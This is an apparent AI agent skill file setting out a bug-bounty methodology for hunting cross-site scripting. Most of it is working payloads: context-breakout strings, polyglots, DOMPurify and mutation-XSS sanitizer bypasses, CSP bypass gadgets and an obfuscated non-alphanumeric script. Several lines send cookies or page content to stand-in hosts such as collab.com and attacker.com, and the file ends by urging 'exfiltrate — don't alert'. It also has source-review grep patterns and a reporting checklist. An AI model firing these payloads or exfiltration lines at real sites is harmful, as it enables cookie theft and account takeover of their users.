---
name: hunt-xss
description: |
  Cross-Site Scripting hunting methodology — reflected, stored, DOM, blind XSS.
  174+ disclosed HackerOne report patterns. CSP bypass tables, sanitizer bypasses,
  injection context analysis, and validation gates.
triggers:
  - hunt xss
  - test for xss
  - cross-site scripting
  - xss payloads
  - reflected xss
  - stored xss
  - dom xss
  - blind xss
category: security
---

# Cross-Site Scripting (XSS) Hunting Methodology

## Crown Jewel Targets

Focus initial effort on these high-impact surfaces:

| Target | Why It Matters |
|--------|----------------|
| **Admin Panels** | Stored XSS here = full account takeover of privileged users |
| **Payment Flows** | High sensitivity, often lack output encoding in receipt/confirmation pages |
| **Stored XSS Features** | Profile fields, comments, display names, bios, support ticket bodies |
| **SSO / OAuth Pages** | Redirect parameters, `callback`, `next`, `return_to` — reflected XSS high ground |
| **SaaS Tenant Surfaces** | Custom subdomain content, custom CSS/JS injection, theme engines |
| **SVG/File Upload** | SVG with embedded script, HTML files rendered inline, XML-based document viewers |
| **JSONP Endpoints** | `callback` parameter reflection with `text/html` or no `charset` |
| **Error Handlers** | 404/500 pages reflecting request URI or parameters |
| **Search Bars** | Classic reflected XSS — search term echoed back in results markup |
| **Export/Download** | CSV/PDF generators that don't escape user-controlled data |

## OOB Confirmation Gate

### What IS Confirmation (validates the finding)

- **HTTP request** from target server to your collaborator (Burp Collaborator, Interact.sh, Canarytokens)
- **DNS lookup** from target server infrastructure — confirms server-side interpretation
- **Cookie read via document.cookie** exfiltrated in the callback
- **Page content exfiltration** (`document.body.innerHTML`, `document.documentElement.outerHTML`)
- **Timing side-channel with data exfil** — e.g., `fetch('//collaborator/?d='+btoa(document.cookie))`
- **Session token** or CSRF token value confirmed in the callback
- **Repeated trigger** from different user session/browser (stored/blind XSS fires for other viewers)

### What IS NOT Confirmation (do NOT file a report on this alone)

- **Alert box** — blocked by CSP, ad blockers, or extension policies in real browsers
- **Console.log output** — not observable by user or server
- **Local collaborator ping with no target-specific data** — could be crawler/worker residue
- **`document.domain` or `window.location`** reflection without exfiltration — proves injection but not impact
- **Self-XSS** that cannot be chained to another user
- **DOM XSS in extension context** — low/no impact on the actual web application
- **Reflection in response body with active HTML encoding** — verify unescaped output

**Golden Rule:** For blind/stored XSS, file only when you have proof the payload executed in a victim browser session — either via OOB callback with unique identifier, or confirmed cookie/token exfiltration.

## Injection Context Analysis

Identify WHERE your input lands before crafting payloads:

### HTML Context (Between Tags)

Input appears between opening/closing tags (e.g., `<div>INPUT</div>`).

**Test:** `<strong>test123</strong>` — if "test123" renders bold, you're in HTML context.

**Payload strategy:** Break out with tag injection:
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Attribute Context

Input appears inside a tag attribute (e.g., `<input value="INPUT">`).

**Identify:** Check if quotes are escaped. Try `"` and see if it breaks the attribute.

**Payload strategy by quote style:**
- Double-quoted: `" autofocus onfocus=alert(1) x="`
- Single-quoted: `' onfocus=alert(1) '`
- Unquoted: ` autofocus onfocus=alert(1)`

**Event handler attributes to try:** `onfocus`, `onmouseover`, `onload`, `onerror`, `onclick`, `onauxclick`, `onpointerenter`, `onpointerdown`

### JavaScript Context

Input lands inside a `<script>` block or JS event handler.

**Identify:** Input appears between `<script>...</script>` or inside `on*="..."` event handlers.

**Payload strategies:**
- In code block: `';alert(1)//`
- In template literal: `${alert(1)}`
- In string with escapes: `<\/script><script>alert(1)<\/script>`
- Inside `eval()` or similar: `alert(1)//`

### URL Context

Input appears in `href=`, `src=`, `action=`, `formaction=`, `poster=`, or `background=`.

**Identify:** The value is used as a URL reference.

**Payload strategies:**
```html
javascript:alert(document.domain)
javascript:fetch('//collab.com/'+document.cookie)
data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
```

**Key check:** Look for protocol whitelisting — `javascript:` may be blocked but `data:` might work, or vice versa.

## Reflected XSS Vectors & Payloads

### Basic Polyglot (try first)
```
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert(1) )//%0D%0A%0D%0A</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert(1)//>\x3e
```

### Short Polyglot
```html
"><img src=x onerror=alert(1)>
```

### Breaking HTML Comments
```html
--!><script>alert(1)</script>
```

### Breaking Textarea
```html
</textarea><script>alert(1)</script>
```

### Breaking Title/Style
```html
</title><script>alert(1)</script>
</style><script>alert(1)</script>
```

### Event Handler Variants
```html
<body onload=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video><source onerror=alert(1)>
<audio onerror=alert(1)>
```

### Vector Tautology (bypassing filters)
```html
<scr<script>alert(1)</script>ipt>
<scr%00ipt>alert(1)</scr%00ipt>
<scri\u0070t>alert(1)</script>
```

## Attribute Context Escapes

### Double-quoted attribute
Input: `<input value="USER_INPUT">`
```html
" autofocus onfocus=alert(1) x="
" onmouseover=alert(1) "
"> <script>alert(1)</script>
" autofocus onfocus=alert(document.cookie) x="
```

### Single-quoted attribute
Input: `<input value='USER_INPUT'>`
```html
' autofocus onfocus=alert(1) x='
' onfocus=alert(1) '
'><script>alert(1)</script>
```

### Unquoted attribute
Input: `<input value=USER_INPUT>`
```html
autofocus onfocus=alert(1)
onfocus=alert(1) x=x
```

### Href attribute
Input: `<a href="USER_INPUT">link</a>`
```html
javascript:alert(1)
javascript:alert(document.cookie)
javascript:fetch('//collab/'+document.cookie)//
```

### CSS expression
Input: Within inline style or `<style>` block
```
expression(alert(1))
-moz-binding:url('data:text/xml;base64,...')
```

Hackish non-alphanumeric:
```js
// Works when alphanumeric chars are blocked
$=~[];$={___:++$,$$$$:(![]+"")[$],__$:++$,$_$_:(![]+"")[$],_$_:++$,$_$$:({}+"")[$],$$_$:($[$]+"")[$],_$$:++$,$$$_:(!""+"")[$],$__:++$,$_$:++$,$$__:({}+"")[$],$$_:++$,$$$:++$,$___:++$,$__$:++$};$.$_=($.$_=$+"")[$.$_$]+($._$=$.$_[$.__$])+($.$$=($.$+"")[$.__$])+((!$)+"")[$._$$]+($.__=$.$_[$.$$_])+($.$=(!""+"")[$.__$])+($._=(!""+"")[$._$_])+$.$_[$.$_$]+$.__+$._$+$.$;$.$$=$.$+(!""+"")[$._$$]+$.__+$._+$.$+$.$$;$.$=($.___)[$.$_][$.$_];$.$($.$($.$$+"\""+$.$_$_+(![]+"")[$._$_]+$.$$$_+"\\"+$.__$+$.$$_+$._$_+$.__+"(\\\"\\\"))"+"\"")())();
```

## Sanitizer Bypasses

### mXSS (Mutation XSS)

**DOMPurify bypass via namespace confusion:**
```html
<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
```

**How it works:** The HTML sanitizer sees safe-looking `<math>` elements. The browser parser mutates the DOM — the `<!--` breaks the style context and the `<img>` becomes executable.

**DOMPurify 2.0 bypass (nested forms):**
```html
<form><math><mtext></form><form><mglyph><svg><mtext><style><path>
<mglyph><style><!--</style><img src=x onerror=alert(1)>
```

### SVG + Style Mutation

```html
<svg><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></svg>
```

**Variant with foreignObject:**
```html
<svg><foreignObject><math><mtext><b><style><![CDATA[</b><img src=x onerror=alert(1)>]]></style></b></mtext></math></foreignObject></svg>
```

### Math + Style Mutation

```html
<math><style><![CDATA[</style><img src=x onerror=alert(1)>]]></style></math>
```

### Table nesting bypass (legacy sanitizers)
```html
<table><tr><td><table><tr><td><script>alert(1)</script></td></tr></table></td></tr></table>
```

### Comment-breaking with conditional tags
```html
<!--[if gte mso 9]><script>alert(1)</script><![endif]-->
```

### Base tag injection
```html
<base href="http://attacker.com/">
```
Changes the base URL for all relative paths — subsequent script tags resolve to attacker origin.

## DOM XSS Sources & Sinks

### Dangerous Sources (user-controllable input points)

| Source | Example |
|--------|---------|
| `document.URL` | Full URL string |
| `document.documentURI` | Same as URL |
| `document.location` | Location object (href, search, hash) |
| `location.href` | Full URL |
| `location.search` | Query string |
| `location.hash` | Fragment identifier |
| `location.pathname` | Path component |
| `document.referrer` | Previous page URL |
| `window.name` | Window name (cross-origin accessible) |
| `document.cookie` | Cookie values |
| `postMessage` data | `message` event data |
| `window.open` result | Returned window reference |
| `history.pushState/replaceState` | State object |
| `URLSearchParams` | Modern URL param access |
| `FormData` entries | Form field values |
| `FileReader` result | File content as string |

### Critical Sinks (execution points)

| Sink | Risk Level | Notes |
|------|-----------|-------|
| `innerHTML` | **Critical** | Direct HTML injection |
| `outerHTML` | **Critical** | Replaces element including itself |
| `insertAdjacentHTML()` | **Critical** | Parses HTML string |
| `document.write()` | **Critical** | Writes to document stream |
| `document.writeln()` | **Critical** | Same as write with newline |
| `eval()` | **Critical** | Arbitrary JS execution |
| `setTimeout(string)` | **High** | String form executes as eval |
| `setInterval(string)` | **High** | String form executes as eval |
| `Function()` | **High** | Constructor creates executable function |
| `new Function()` | **High** | Same as above |
| `script.src` | **High** | Dynamic script loading |
| `iframe.src` / `iframe.srcdoc` | **High** | `srcdoc` particularly dangerous |
| `object.data` | **High** | Can load external content |
| `embed.src` | **High** | Plugin content |
| `location.href` / `location.assign()` | **High** | `javascript:` URI possible |
| `location.replace()` | **High** | Same as assign, no history |
| `window.open(url)` | **Medium** | If url is `javascript:` |
| `anchor.href` | **Medium** | If href is `javascript:` |
| `form.action` | **Medium** | Can direct form submission |
| `postMessage(targetOrigin)` | **Medium** | If targetOrigin is `*` |
| `CSP trustedTypes` sink | **Medium** | If Trusted Types policy is violated |
| `range.createContextualFragment()` | **High** | Creates DOM from HTML string |

### DOM XSS Testing Payloads

**location.hash:**
```
https://target.com/page.html#<img src=x onerror=alert(1)>
https://target.com/page.html#<svg onload=alert(1)>
```

**location.search:**
```
https://target.com/page.html?q=<script>alert(1)</script>
```

**postMessage:**
```js
// In attacker page:
window.open('https://target.com').postMessage('<img src=x onerror=alert(1)>', '*')
```

**URLSearchParams:**
```
https://target.com/page.html?name=<svg onload=alert(1)>
```

## Grep Patterns for Source Code Review

### Dangerous functions (JavaScript)
```bash
# DOM XSS sinks
grep -rn "innerHTML\b" --include="*.js" --include="*.html"
grep -rn "outerHTML\b" --include="*.js" --include="*.html"
grep -rn "insertAdjacentHTML\b" --include="*.js"
grep -rn "document.write\b" --include="*.js" --include="*.html"
grep -rn "\.html(" --include="*.js" # jQuery
grep -rn "\.append(" --include="*.js"
grep -rn "\.prepend(" --include="*.js"
grep -rn "\.before(" --include="*.js"
grep -rn "\.after(" --include="*.js"
grep -rn "\.replaceAll(" --include="*.js"
grep -rn "\.replaceWith(" --include="*.js"
grep -rn "\.wrapAll(" --include="*.js"
grep -rn "eval(" --include="*.js"
grep -rn "setTimeout(" --include="*.js"
grep -rn "setInterval(" --include="*.js"
grep -rn "new Function(" --include="*.js"
grep -rn "location\s*=" --include="*.js"
grep -rn "location\.href" --include="*.js"
```

### Template engines (server-side)
```bash
# Look for unescaped output
grep -rn "{\|{" --include="*.hbs"      # Handlebars unsafe
grep -rn "{{{" --include="*.hbs"       # Triple-stash = raw HTML
grep -rn "\.raw" --include="*.ejs"     # EJS unescaped output
grep -rn "\.render(" --include="*.py"  # Django/Jinja
grep -rn "mark_safe\|&#124;safe" --include="*.py"  # Django bypasses
grep -rn "html.safe" --include="*.rb"  # Rails
grep -rn "raw\|html_safe" --include="*.erb"
grep -rn "v-html" --include="*.vue"    # Vue.js raw HTML binding
grep -rn "dangerouslySetInnerHTML" --include="*.jsx" --include="*.tsx"  # React
grep -rn "innerHTML" --include="*.ts" --include="*.tsx"  # Angular
grep -rn "bypassSecurityTrust" --include="*.ts"  # Angular bypass
```

### Dangerous attributes (HTML)
```bash
grep -rn "href=[""']javascript:" --include="*.html" --include="*.js"
grep -rn "onerror=" --include="*.html"
grep -rn "onload=" --include="*.html"
grep -rn "onclick=" --include="*.html"
grep -rn "onfocus=" --include="*.html"
grep -rn "onsubmit=" --include="*.html"
grep -rn "srcdoc=" --include="*.html"
grep -rn "formaction=" --include="*.html"
```

### Trusted Types bypasses
```bash
grep -rn "trustedTypes" --include="*.js"
grep -rn "createPolicy" --include="*.js"
grep -rn "defaultPolicy" --include="*.js"
```

### JSON/API responses
```bash
grep -rn "Content-Type.*text/html" --include="*.py" --include="*.js" --include="*.java"
grep -rn ".innerHTML\|\.html(" --include="*.js" | grep -v "test\|spec\|\.min\."
```

## Top 10 Common Root Causes

| # | Root Cause | Example |
|---|------------|---------|
| 1 | **Missing output encoding** | User input inserted into HTML without escaping `<>&\"'` |
| 2 | **Improper context encoding** | Using HTML entity encoding (`&lt;`) when JavaScript context needs `\\x3c` |
| 3 | **`innerHTML` instead of `textContent`** | Setting user content via `element.innerHTML` instead of `element.textContent` |
| 4 | **`v-html` / `dangerouslySetInnerHTML`** | Framework raw HTML bindings without sanitization |
| 5 | **CSP bypass via JSONP / known endpoints** | Old Google API JSONP endpoints, Akamai CDN scripts |
| 6 | **Unsanitized `location.hash` or `location.search`** | Reading URL fragments and injecting into DOM |
| 7 | **`postMessage` with no origin validation** | Listening for messages and injecting into DOM without checking `event.origin` |
| 8 | **Trusted Types policy misconfiguration** | Creating a permissive default policy that accepts all strings |
| 9 | **DOM clobbering** | Attacker-controlled HTML elements shadowing global JS variables |
| 10 | **Server-side template injection** | Template engines like Handlebars, Nunjucks rendering user input as templates |

## CSP Bypass Techniques

### CSP Evaluation Priority

When testing XSS with CSP, try these in order:

1. **Is there a CSP at all?** Check response headers for `Content-Security-Policy`
2. **Is `script-src` or `default-src` set?** If neither exists, no CSP protection
3. **Is `unsafe-inline` present?** If yes, XSS works normally
4. **Is there a CDN endpoint in the whitelist?** Try script gadgets
5. **Is `strict-dynamic` used?** Only first-party scripts can execute
6. **Is `nonce` or `hash` used?** Requires knowing the nonce (hard unless reflected)

### CSP Bypass Methods

| CSP Directive | Bypass Technique | Example |
|--------------|-----------------|---------|
| `script-src 'unsafe-inline'` | Direct injection | `<script>alert(1)</script>` |
| No `object-src` (defaults to block) | `<object>` fallback | `<object data="data:text/html;base64,...">` |
| `script-src 'self'` via JSONP | Find JSONP endpoint on same origin | `<script src="/api/callback?cb=alert(1)>` |
| `script-src *.google.com` | Google JS API gadget | Use Angular, Firebug, or Prototype gadgets |
| `script-src *.cloudflare.com` | Cloudflare CDN gadget | Known script gadgets exist |
| `script-src cdnjs.cloudflare.com` | Known library gadget | `<script src="//cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js">` then gadget |
| `script-src ajax.googleapis.com` | Angular gadget | `<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js">` + `ng-c` directive |
| `script-src 'unsafe-eval'` | `eval()`-based gadget | `eval("alert(1)")` or `setTimeout("alert(1)")` |
| `strict-dynamic` | First-party script injection | XSS in a JS file or JSON endpoint loaded by first-party script |
| `base-uri` not set | Base tag injection | `<base href="//attacker.com/">` alters relative script resolution |
| `form-action` not set | Form action hijacking | `<form action="//attacker.com/steal"><button>Click</button></form>` |

### Script Gadgets (when CSP whitelists specific JS libraries)

**Angular (ajax.googleapis.com):**
```html
<script src="//ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.js">
</script><div ng-app ng-c p="//x.com/?{{x=$event.constructor.constructor('alert(1)')()}}">
```

**Prototype.js:**
```html
<script src="//cdnjs.cloudflare.com/ajax/libs/prototype/1.7.2/prototype.js">
</script><div id="x">test</div>
<script>Element.prototype.append=function(){eval("alert(1)")};new Insertion.Top('x','<script>alert(1)</script>');</script>
```

**jQuery:**
```html
<script src="//code.jquery.com/jquery-3.6.0.min.js">
</script><div id="x">test</div>
<script>$.globalEval("alert(1)")</script>
```

**Hat Trick (no src required if script-src is 'self' and jQuery loaded by page):**
```html
<script>$.getScript("//attacker.com/x.js")</script>
```

### CSP Info Leak Bypasses

Even when you can't execute JS, you can exfiltrate data:

| Technique | Mechanism |
|-----------|-----------|
| DNS prefetch | `<link rel="dns-prefetch" href="//attacker.com/">` |
| CSS injection | `input[value^="a"]{background:url(//attacker.com/a)}` |
| Meta refresh | `<meta http-equiv="refresh" content="0;url=//attacker.com/">` |
| Form hijacking | `<form action="//attacker.com/steal" method="GET"><button>Submit</button></form>` |
| Link prefetch | `<link rel="prefetch" href="//attacker.com/steal?data=...">` |

## Validation Checklist (Before Reporting)

### Confirmation Tests

- [ ] Input is reflected/rendered **unescaped** in the response or DOM
- [ ] Confirmed the exact injection point (HTML / attribute / JS / URL context)
- [ ] Payload executes in latest stable Chrome, Firefox, and Safari
- [ ] For blind/stored XSS: OOB callback received with unique identifier
- [ ] For blind/stored XSS: callback includes exfiltrated data (cookie, page content)
- [ ] For reflected XSS: reproduced with minimal payload, no redundant characters
- [ ] No input truncation or encoding that would prevent practical exploitation

### Impact Assessment

- [ ] What user role is affected? (admin > user > unauthenticated)
- [ ] Can you steal session cookies? (HttpOnly flag check)
- [ ] Can you perform actions on behalf of the victim? (CSRF tokens accessible?)
- [ ] Is the vulnerable page accessible to the target user type?
- [ ] For stored XSS: does the payload fire on page load (no user interaction needed)?
- [ ] For stored XSS: does the payload fire for all viewers or only the author?

### CSP Analysis

- [ ] What CSP directives are in place?
- [ ] Can CSP be bypassed? (unsafe-inline, CDN gadgets, missing directives)
- [ ] Is there a report-uri/report-to for CSP violations? (indicates active monitoring)
- [ ] Can you exfiltrate without JS? (form action, CSS injection, DNS prefetch)

### Report Preparation

- [ ] PoC URL or payload documented clearly
- [ ] Steps to reproduce (1, 2, 3...)
- [ ] Impact statement written (what an attacker can do)
- [ ] Screenshot or video of execution (using Collaborator or Canarytokens, not alert())
- [ ] Suggested fix: output encoding (context-specific) + CSP headers
- [ ] Tested that exploit works cross-origin (for reflected/ DOM XSS)
- [ ] Verified vulnerability is not a duplicate of a known fixed issue
- [ ] Tested without browser extensions/ad blockers to ensure reproducibility

### Common Pitfalls

- ❌ Reporting XSS that only fires in old IE (check modern browsers)
- ❌ Reporting XSS blocked by CSP without a bypass method
- ❌ Alert-based PoC when CSP blocks inline scripts (use `fetch()` or `Image()` instead)
- ❌ Self-XSS that requires victim to paste code
- ❌ DOM XSS in no-longer-maintained library version (check `package.json` bundled deps)
- ❌ Not verifying the XSS actually reads/writes data in the application context

## Quick Reference: Payloads by Context

```text
HTML context:         <script>alert(1)</script>
HTML context svg:     <svg onload=alert(1)>
Attribute "quoted":   " autofocus onfocus=alert(1) x="
Attribute 'quoted':   ' onfocus=alert(1) '
Attribute unquoted:   autofocus onfocus=alert(1)
JavaScript string:    ';alert(1)//
JavaScript tmpl ltr:  ${alert(1)}
URL href:             javascript:alert(1)
CSS expression:       expression(alert(1))
mXSS bypass:          <math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>
CSP bypass Angular:   <div ng-app ng-c p="//x.com/?{{constructor.constructor('alert(1)')()}}">
CSP bypass JSONP:     <script src="/jsonp?callback=alert(1)">
```

## Tools & Automation

| Tool | Purpose |
|------|---------|
| **Burp Suite Pro** | Active scan, Repeater, Intruder for parameter fuzzing |
| **XSStrike** | Automated XSS detection with context analysis |
| **Dalfox** | Fast parameter-based XSS scanner |
| **DOMPurify** | Local testing of sanitizer bypasses |
| **Interact.sh / Burp Collaborator** | OOB detection for blind XSS |
| **Canarytokens** | Simple OOB triggers via URL/dns tokens |
| **Custom payload list** | `fbook` XSS payload list, `payloadsallthethings` |
| **Browser DevTools** | Manual DOM inspection, breakpoint debugging |
| **Content Security Policy Evaluator** | CSP analysis (`csp-evaluator.withgoogle.com`) |

---

*Methodology derived from 174+ disclosed HackerOne XSS reports. Always verify with multiple browsers and no extensions. When in doubt, exfiltrate — don't alert.*
